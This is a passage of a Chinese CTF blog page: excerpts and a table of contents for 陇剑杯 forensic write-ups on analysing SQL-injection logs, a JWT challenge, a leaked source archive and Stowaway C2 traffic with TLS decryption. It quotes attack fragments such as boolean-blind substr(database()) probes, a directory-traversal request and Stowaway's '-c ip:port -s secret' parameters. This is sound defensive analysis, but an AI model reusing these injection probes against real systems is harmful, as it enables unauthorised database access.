环境文件下载附件SQL注入，解压文件 二.解题步骤问（1） 1.1-1 打开网站访问日志access.log1.1-2 检索注入特征关键词：substr1.1-3 根据布尔盲注的特征可以知道，本题考查布尔盲注1.1-4 所以本题考查的注入手法即为布尔盲注，即flag为布尔盲注问（2） 1.2-1 检索关键词database，查询数据库1.2-2 从日志读出数据库名 这条日志说明读取当前数据库名第1位字符，说明数据库第一个字母是s， 接着按照顺序一个个猜出来，字母顺序也是按照先前到后的顺序  substr(database(),1,1) ——第1个字符，猜出来是s substr(database(),2,1) ——第2个字符，猜出来是q substr(database(),3,1) ——第3个字符，猜出来是l substr(database(),4,1) ——第4个字符，猜出来是i  1.2-3 拼起来得到数据库名sqli1.2-4 继续检索关键词table_n...</div></div></div></a><a class="pagination-related" href="/2026/08/09/%E9%99%87%E5%89%91%E6%9D%AF-jwt-wp/" title="陇剑杯-jwt-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-09</div><div class="info-item-2">陇剑杯-jwt-wp</div></div><div class="info-2"><div class="info-item-1">一.题目介绍单位流量系统捕获了黑客攻击流量，分析流量拿到flag 1.1 考点 流量分析 日志审计 webshell流量  1.2 环境文件下载附件jwt.zip，解压数据包 二.解题步骤问（1） 2.1-1 在wireshark过滤栏输入&quot;http&quot; 2.1-2 逐个右键数据包——【追踪流】——【TCP流】，可以找到请求CookieCookie: PHPSESSID&#x3D;3f8coeg6hm9vf0h5lcoifmk8o5; token&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODcsIk1hcENsYWltcyI6eyJ1c2VybmFtZSI6ImFkbWluIn19.rurQD5RYgMrFZow8r-k7KCP13P32sF-RpTXhKsxzvD0  2.1-3 根据JWT识别特征，可以知道jwt就是网站认证方式2.1-4 flag为jwt问（2） 2.2-1 在过滤栏输入&quot;http&quot;2.2-2 追踪TCP流，找到攻击请求，即既有Cookie，又有Toke...</div></div></div></a><a class="pagination-related" href="/2026/08/05/%E9%99%87%E5%89%91%E6%9D%AF%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-wp/" title="陇剑杯日志分析-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-05</div><div class="info-item-2">陇剑杯日志分析-wp</div></div><div class="info-2"><div class="info-item-1">一.题目介绍网络存在源码泄露，需要找到源码文件名  1.1 考点 日志分析 PHP反序列 完整攻击链  1.2 环境文件下载附件，解压数据包 二.解题步骤：问（1） 2.1-1 开启环境得到一个附件日志分析.zip，解压得到access.log，用记事本打开有如下信息 2.1-2 筛选有效访问记录·源码泄露需要满足：客户端发起 GET 请求 + 服务器返回状态码 200（访问成功） 使用快捷键 Ctrl+F 检索关键词：200，一直点击【查找下一个】，直到日志中有类似www%2ezip、www%2erar出现  2.1-3 可以找到这条关键记录 表明黑客成功访问并下载了&#x2F;www.zip 文件 2.1-4 所以泄露的源码文件名为：www.zip，即NSSCTF{www.zip}问（2） 解题步骤： 2.2-1 筛选成功包，即200状态码，不要看扫描包，即404状态码2.2-2 识别漏洞模式：目录穿越+文件写入攻击请求一般是带参数的请求，不是直接访问文件，格式类似于： GET &#x2F;?filename&#x3D;大量..%2Ftmp%2Fsess_car&amp;co...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">John Doe</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-number">1.</span> <span class="toc-text">一.题目要求</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E8%80%83%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E7%8E%AF%E5%A2%83%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 环境文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">二.解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-%E5%9C%A8%E8%BF%87%E6%BB%A4%E6%A0%8F%E8%BE%93%E5%85%A5tcp%EF%BC%8C%E7%AD%9B%E9%80%89%E5%8F%AF%E7%96%91%E6%B5%81%E9%87%8F"><span class="toc-number">2.1.</span> <span class="toc-text">2.1-1 在过滤栏输入tcp，筛选可疑流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-%E4%BB%BB%E6%84%8F%E9%80%89%E4%B8%AD%E4%B8%80%E6%9D%A1tcp%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E5%8F%B3%E9%94%AE%E2%80%94%E2%80%94%E8%BF%BD%E8%B8%AA%E6%B5%81%E2%80%94%E2%80%94TCP%E6%B5%81%EF%BC%8C%E4%BE%9D%E6%AC%A1%E6%B5%8F%E8%A7%88%E6%AF%8F%E4%B8%80%E5%A4%A9%E4%BC%9A%E8%AF%9D%E5%86%85%E5%AE%B9%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%A4%A7%E9%83%A8%E5%88%86%E9%83%BD%E6%98%AF%E4%B9%B1%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">2.1-2 任意选中一条tcp数据包，右键——追踪流——TCP流，依次浏览每一天会话内容，发现大部分都是乱码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-%E6%B5%8F%E8%A7%88%E5%88%B0tcp-stream-eq-15%E6%97%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%85%B3%E9%94%AE%E4%BC%9A%E8%AF%9D%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">2.1-3 浏览到tcp.stream eq 15时，可以看到关键会话：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4-%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93flag%E4%B8%BA3-128-156-159"><span class="toc-number">2.4.</span> <span class="toc-text">2.1-4 可以知道flag为3.128.156.159</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E5%9C%A8%E8%BF%87%E6%BB%A4%E6%A0%8F%E8%BE%93%E5%85%A5tcp-contains-ios-agent"><span class="toc-number">2.5.</span> <span class="toc-text">2.2-1 在过滤栏输入tcp contains &quot;ios_agent&quot;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-%E5%BE%97%E5%88%B0%E5%92%8C%E9%97%AE%EF%BC%881%EF%BC%89%E4%B8%80%E8%87%B4%E7%9A%84%E5%85%B3%E9%94%AE%E4%BC%9A%E8%AF%9D"><span class="toc-number">2.6.</span> <span class="toc-text">2.2-2 得到和问（1）一致的关键会话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-%E6%90%9C%E7%B4%A2%E5%91%BD%E4%BB%A4%E7%89%B9%E5%BE%81%EF%BC%9Agent-c-ip-port-s-secret%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E5%BC%80%E6%BA%90%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7stowaway%E7%9A%84%E6%A0%87%E5%BF%97%E6%80%A7%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.7.</span> <span class="toc-text">2.2-3 搜索命令特征：gent -c ip:port -s secret，发现是开源多级代理工具stowaway的标志性启动参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-4-%E6%89%80%E4%BB%A5github%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%90%8D%E5%AD%97%E5%B0%B1%E6%98%AFstowaway"><span class="toc-number">2.8.</span> <span class="toc-text">2.2-4 所以github开源项目的名字就是stowaway</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-%E5%92%8C%E9%97%AE%EF%BC%882%EF%BC%89%E4%B8%80%E6%A0%B7%E5%9C%A8%E8%BF%87%E6%BB%A4%E6%A0%8F%E8%BE%93%E5%85%A5tcp-contains-ios-agent"><span class="toc-number">2.9.</span> <span class="toc-text">2.3-1 和问（2）一样在过滤栏输入tcp contains &quot;ios_agent&quot;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-%E4%BE%9D%E6%97%A7%E5%BE%97%E5%88%B0%E5%85%B3%E9%94%AE%E4%BC%9A%E8%AF%9D%EF%BC%9A"><span class="toc-number">2.10.</span> <span class="toc-text">2.3-2 依旧得到关键会话：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-3-%E5%BE%97%E5%88%B0%E5%AF%86%E9%92%A5%E4%B8%BAhack4sec"><span class="toc-number">2.11.</span> <span class="toc-text">2-3-3 得到密钥为hack4sec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-%E8%A7%A3%E5%AF%86TLS%E6%B5%81%E9%87%8F%EF%BC%9A%E5%9C%A8wireshark%E4%B8%AD%E7%82%B9%E5%87%BB%E3%80%90%E7%BC%96%E8%BE%91%E3%80%91%E2%80%94%E2%80%94%E3%80%90%E9%A6%96%E9%80%89%E9%A1%B9%E3%80%91%E2%80%94%E2%80%94%E3%80%90Protocol%E3%80%91%E2%80%94%E2%80%94%E3%80%90TLS%E3%80%91"><span class="toc-number">2.12.</span> <span class="toc-text">2.4-1 解密TLS流量：在wireshark中点击【编辑】——【首选项】——【Protocol】——【TLS】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-2"><span class="toc-number">2.13.</span> <span class="toc-text">2.4-2 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-3-%E5%9C%A8%E8%BF%87%E6%BB%A4%E6%A0%8F%E8%BE%93%E5%85%A5ip-src-192-168-1-12-http2"><span class="toc-number">2.14.</span> <span class="toc-text">2.4-3 在过滤栏输入ip.src &#x3D;&#x3D; 192.168.1.12 &amp;&amp; http2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-4-%E4%BB%BB%E6%84%8F%E9%80%89%E4%B8%AD%E4%B8%80%E6%9D%A1HTTP2%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E5%9C%A8%E4%B8%8B%E6%96%B9%E7%AA%97%E5%8F%A3%E5%B1%95%E5%BC%80"><span class="toc-number">2.15.</span> <span class="toc-text">2.4-4 任意选中一条HTTP2数据包，在下方窗口展开</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-5-%E9%81%8D%E5%8E%86%E6%89%80%E6%9C%89HTTP2%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%93%8D%E5%BA%94%E5%BB%B6%E8%BF%9F%EF%BC%8C%E6%8A%8A%E6%89%80%E6%9C%89%E7%8C%9C%E5%AF%B9%E7%9A%84hex%E5%AD%97%E7%AC%A6%E6%8C%89%E7%85%A7%E5%85%88%E5%90%8E%E9%A1%BA%E5%BA%8F%E6%8B%BC%E6%8E%A5%E8%B5%B7%E6%9D%A5"><span class="toc-number">2.16.</span> <span class="toc-text">2.4-5 遍历所有HTTP2请求，观察响应延迟，把所有猜对的hex字符按照先后顺序拼接起来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-6-%E6%94%B6%E9%9B%86%E5%AE%8C%E5%90%8E%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%BA"><span class="toc-number">2.17.</span> <span class="toc-text">2.4-6 收集完后的字符为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-7-%E6%89%93%E5%BC%80%E5%9C%A8%E7%BA%BF%E8%A7%A3%E7%A0%81%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%B0%86%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0%EF%BC%9A"><span class="toc-number">2.18.</span> <span class="toc-text">2.4-7 打开在线解码工具，将上面的十六进制字符串解码得到：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">三.相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Stowaway%EF%BC%88%E5%81%B7%E6%B8%A1%E8%80%85%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Stowaway（偷渡者）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Stowaway%E5%9B%BA%E5%AE%9A%E5%8F%82%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 Stowaway固定参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3"><span class="toc-number">3.3.</span> <span class="toc-text">3.3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-1-Stowaway-%E8%BF%9C%E6%8E%A7%E6%B5%81%E9%87%8F%EF%BC%88ios%E2%80%91agent%EF%BC%89%E6%98%AFTCP-%E5%8E%9F%E5%A7%8B%E6%B5%81%E9%87%8F%EF%BC%8C%E8%B5%B0%E7%9A%84-8081-%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.3.1.</span> <span class="toc-text">3.3-1 Stowaway 远控流量（ios‑agent）是TCP 原始流量，走的 8081 端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-2-SQL-%E7%9B%B2%E6%B3%A8%E6%98%AF%E5%8F%A6%E5%A4%96%E4%B8%80%E6%9D%A1%E7%8B%AC%E7%AB%8B%E6%B5%81%E9%87%8F%EF%BC%9A%E6%89%8B%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%91%E8%B5%B7-HTTPS-%E8%AE%BF%E9%97%AE%EF%BC%8C%E7%94%A8-HTTP2"><span class="toc-number">3.3.2.</span> <span class="toc-text">3.3-2 SQL 盲注是另外一条独立流量：手机浏览器发起 HTTPS 访问，用 HTTP2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-3-%E5%A6%82%E6%9E%9C%E5%8F%AA%E5%86%99ip-addr-192-168-1-12%EF%BC%8C%E4%BC%9A%E6%8A%8A%E8%BF%9C%E6%8E%A7-stowaway%E3%80%81wifi-%E6%B5%81%E9%87%8F%E3%80%81%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E7%AD%89%E6%89%80%E6%9C%89%E6%9D%82%E4%B9%B1%E6%95%B0%E6%8D%AE%E5%8C%85%E5%85%A8%E9%83%A8%E7%AD%9B%E5%87%BA%E6%9D%A5%EF%BC%9B"><span class="toc-number">3.4.</span> <span class="toc-text">3.3-3 如果只写ip.addr &#x3D;&#x3D; 192.168.1.12，会把远控 stowaway、wifi 流量、网站访问等所有杂乱数据包全部筛出来；</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-128-156-159%EF%BC%9AStowaway-%E8%BF%9C%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8-IP%EF%BC%88%E9%97%AE1%E7%AD%94%E6%A1%88%EF%BC%8C%E7%94%A8%E6%9D%A5%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%89%8B%E6%9C%BA%EF%BC%89"><span class="toc-number">3.4.1.</span> <span class="toc-text">1. 3.128.156.159：Stowaway 远控服务器 IP（问1答案，用来远程控制手机）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-SQL-%E7%9B%B2%E6%B3%A8%E6%94%BB%E5%87%BB%EF%BC%9A%E4%B8%8D%E6%98%AF%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E9%BB%91%E5%AE%A2-C-C-%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E8%80%8C%E6%98%AF%E9%BB%91%E5%AE%A2%E6%8E%A7%E5%88%B6%E4%BD%A0%E7%9A%84%E6%89%8B%E6%9C%BA%EF%BC%8C%E8%AE%A9%E6%89%8B%E6%9C%BA%E5%8E%BB%E6%94%BB%E5%87%BB%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BD%91%E7%AB%99%EF%BC%8C%E5%8F%91%E5%87%BA%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E5%8C%85%E3%80%82%E6%89%80%E4%BB%A5%E7%9B%B2%E6%B3%A8%E6%B5%81%E9%87%8F%E7%9A%84%E7%9B%AE%E6%A0%87-IP%E4%B8%8D%E6%98%AF3-128-156-159%EF%BC%8C%E8%80%8C%E6%98%AF%E8%A2%AB%E6%94%BB%E5%87%BB-Web-%E7%AB%99%E7%82%B9%E7%9A%84%E5%85%AC%E7%BD%91-IP"><span class="toc-number">3.4.2.</span> <span class="toc-text">2. SQL 盲注攻击：不是直接访问黑客 C&amp;C 服务器，而是黑客控制你的手机，让手机去攻击第三方网站，发出注入数据包。所以盲注流量的目标 IP不是3.128.156.159，而是被攻击 Web 站点的公网 IP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.5.</span> <span class="toc-text">3.4 布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E4%BB%80%E4%B9%88%E6%98%AFTLS%EF%BC%9F"><span class="toc-number">3.6.</span> <span class="toc-text">3.5 什么是TLS？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-%E6%80%8E%E4%B9%88%E8%A7%A3%E5%BC%80TLS%EF%BC%9F"><span class="toc-number">3.7.</span> <span class="toc-text">3.6 怎么解开TLS？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-6-1-Pre%E2%80%91Master%E2%80%91Secret-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%88key-log%EF%BC%89%E6%96%B9%E6%A1%88%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AF%86%E9%92%A5%E3%80%91%EF%BC%88%E6%9C%80%E5%B8%B8%E7%94%A8%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8A%93%E5%8C%85%EF%BC%89%EF%BC%9A%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%A8TLS%E6%8F%A1%E6%89%8B%E6%97%B6%E7%94%9F%E6%88%90Pre%E2%80%91Master%E2%80%91Secret%EF%BC%8C%E6%8A%8A%E8%BF%99%E4%B8%AA%E5%AF%86%E9%92%A5%E5%86%99%E5%85%A5key-log%E3%80%82Wireshark-%E5%88%A9%E7%94%A8%E8%BF%99%E4%BB%BD%E5%AF%86%E9%92%A5%EF%BC%8C%E8%A7%A3%E5%AF%86%E5%90%8E%E7%BB%AD%E6%89%80%E6%9C%89%E5%8A%A0%E5%AF%86%E6%8A%A5%E6%96%87%E3%80%82"><span class="toc-number">3.7.1.</span> <span class="toc-text">3.6-1 Pre‑Master‑Secret 日志文件（key.log）方案【客户端密钥】（最常用，浏览器抓包）：浏览器在TLS握手时生成Pre‑Master‑Secret，把这个密钥写入key.log。Wireshark 利用这份密钥，解密后续所有加密报文。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-6-2-RSA-%E7%A7%81%E9%92%A5%E8%A7%A3%E5%AF%86%E6%96%B9%E6%A1%88%E3%80%90%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%A7%81%E9%92%A5%E3%80%91%EF%BC%88%E6%8B%BF%E5%88%B0%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%81%E4%B9%A6%E7%A7%81%E9%92%A5%EF%BC%89"><span class="toc-number">3.7.2.</span> <span class="toc-text">3.6-2 RSA 私钥解密方案【服务端私钥】（拿到网站服务器证书私钥）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-TLS%E6%8F%A1%E6%89%8B"><span class="toc-number">3.8.</span> <span class="toc-text">3.7 TLS握手</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Client-Hello%EF%BC%88%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%97%AE%E5%80%99%EF%BC%89"><span class="toc-number">3.8.1.</span> <span class="toc-text">1. Client Hello（客户端问候）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Server-Hello%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%97%AE%E5%80%99%EF%BC%89"><span class="toc-number">3.8.2.</span> <span class="toc-text">2. Server Hello（服务器问候）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8B%E5%8F%91%E8%AF%81%E4%B9%A6-Certificate"><span class="toc-number">3.8.3.</span> <span class="toc-text">3. 服务器下发证书 (Certificate)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%8F%8C%E6%96%B9%E4%BA%A4%E6%8D%A2%E6%9D%90%E6%96%99%EF%BC%8C%E7%AE%97%E5%87%BA-Pre%E2%80%91Master%E2%80%91Secret%EF%BC%88%E9%A2%84%E4%B8%BB%E5%AF%86%E9%92%A5%EF%BC%89"><span class="toc-number">3.8.4.</span> <span class="toc-text">4. 双方交换材料，算出 Pre‑Master‑Secret（预主密钥）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-TLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">3.9.</span> <span class="toc-text">3.8 TLS加密通信流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%8B%E6%9C%BA-%E2%86%94-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8F%A1%E6%89%8B%EF%BC%8C%E5%8D%8F%E5%95%86%E5%8A%A0%E5%AF%86%E8%A7%84%E5%88%99%E3%80%81%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5"><span class="toc-number">3.9.1.</span> <span class="toc-text">1. 手机 ↔ Web 服务器握手，协商加密规则、生成密钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%89%8B%E6%9C%BA%E5%8F%91%E9%80%81%E7%9B%B2%E6%B3%A8%E8%AF%B7%E6%B1%82%EF%BC%9A-info-l-1-o-case-when-%EF%BC%8C%E5%85%88%E8%A2%AB-TLS-%E5%8A%A0%E5%AF%86%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AF%86%E6%96%87%EF%BC%8C%E5%86%8D%E5%8F%91%E5%87%BA%E5%8E%BB"><span class="toc-number">3.9.2.</span> <span class="toc-text">2. 手机发送盲注请求：&#x2F;info?l&#x3D;1&amp;o&#x3D;(case when ...)，先被 TLS 加密成二进制密文，再发出去</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Wireshark%E6%8A%93%E5%88%B0%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">3.9.3.</span> <span class="toc-text">3. Wireshark抓到加密后的数据包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Wireshark%E4%BD%BF%E7%94%A8key-log%E9%87%8C%E9%9D%A2%E7%9A%84%E5%AF%86%E9%92%A5%E8%A7%A3%E5%AF%86%EF%BC%8C%E8%BF%98%E5%8E%9F%E5%87%BA%E5%8E%9F%E5%A7%8B%E6%98%8E%E6%96%87-URL"><span class="toc-number">3.9.4.</span> <span class="toc-text">4. Wireshark使用key.log里面的密钥解密，还原出原始明文 URL</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/" title="陇剑杯-iOS-wp">陇剑杯-iOS-wp</a><time datetime="2026-08-16T13:22:39.000Z" title="Created 2026-08-16 21:22:39">2026-08-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/16/CISCN-wp/" title="CISCN-wp">CISCN-wp</a><time datetime="2026-08-16T12:04:53.000Z" title="Created 2026-08-16 20:04:53">2026-08-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/15/%E9%99%87%E5%89%91%E6%9D%AF-SQL%E6%B3%A8%E5%85%A5-wp/" title="陇剑杯-SQL注入-wp">陇剑杯-SQL注入-wp</a><time datetime="2026-08-15T11:21:45.000Z" title="Created 2026-08-15 19:21:45">2026-08-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/09/%E9%99%87%E5%89%91%E6%9D%AF-jwt-wp/" title="陇剑杯-jwt-wp">陇剑杯-jwt-wp</a><time datetime="2026-08-09T06:52:40.000Z" title="Created 2026-08-09 14:52:40">2026-08-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/05/%E9%99%87%E5%89%91%E6%9D%AF-webshell-wp/" title="陇剑杯-webshell-wp">陇剑杯-webshell-wp</a><time datetime="2026-08-05T13:56:22.000Z" title="Created 2026-08-05 21:56:22">2026-08-05</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By John Doe</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
